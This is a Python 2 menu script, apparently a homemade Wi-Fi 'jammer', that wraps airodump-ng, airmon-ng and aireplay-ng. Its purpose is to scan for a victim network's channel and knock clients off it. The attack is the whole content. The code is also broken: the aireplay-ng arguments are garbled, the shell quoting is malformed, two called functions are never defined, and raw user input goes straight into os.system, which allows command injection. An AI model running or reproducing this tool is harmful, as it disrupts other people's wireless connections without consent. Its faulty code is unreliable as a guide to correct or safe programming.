#!/usr/bin/python
# -*- coding: utf-8  -*-
import subprocess
import os
from time import sleep
import time
from netifaces import interfaces, ifaddresses, AF_INET


def template():
    os.system('clear')
    print ("""\033[1m\033[5m\033[31m/ ____|     | |\n| (___  __ _| |_ ___ ___  _ __ ___\n\___ \ / _` | __/ __/ _ \| '_ ` _ \ \n____) | (_| | || (_| (_) | | | | | |\n|____/ \__,_|\__\___\___/|_| |_| |_| \033[0m \033[37m""")
    print ("---Script by Satcom--- \n")
    print('\n ----------------------------------------------------')
    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP address'}] )]
        print '   		%s: %s' % (ifaceName, ', '.join(addresses))
    print(' ----------------------------------------------------')



def main():
    template()
    answ=True
    while answ:
        print("""
         1.Jam !
         2.CREDITS

         00.Exit
         """)
        ans=raw_input("What would you like to do? ")
        if ans=="1":
            template()
            print " Lets Jam"
            print "-" * 64
            for ifaceName in interfaces():
                addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP address'}] )]
                print '   		%s: %s' % (ifaceName, ', '.join(addresses))
            interface = raw_input('which interface you want use ?  ')
            print "Remember to copy your mac address and channel victim !"
            time.sleep(2)
            print " Lets recon"
            os.system("xterm -e 'echo press ctrl + c && airodump-ng "+interface+"' && read'")
            channel = raw_input("Target Channel: ")
            print "Put interface in monitor mode..."
            os.system("xterm -e 'airmon-ng start "+interface+"' '"+channel+"' && read'")
            os.system("xterm -e 'aireplay-ng -o 999 -c "+interface+" && read'")
        elif ans=="2":
            credits()
        elif ans=="00":
          my_quit_fn()
          ans = None
        else:
            os.system('clear')
            print("\n Not Valid Choice Try again")
            time.sleep(0.5)
            os.system('clear')
            main()









if __name__ == "__main__":
	main()
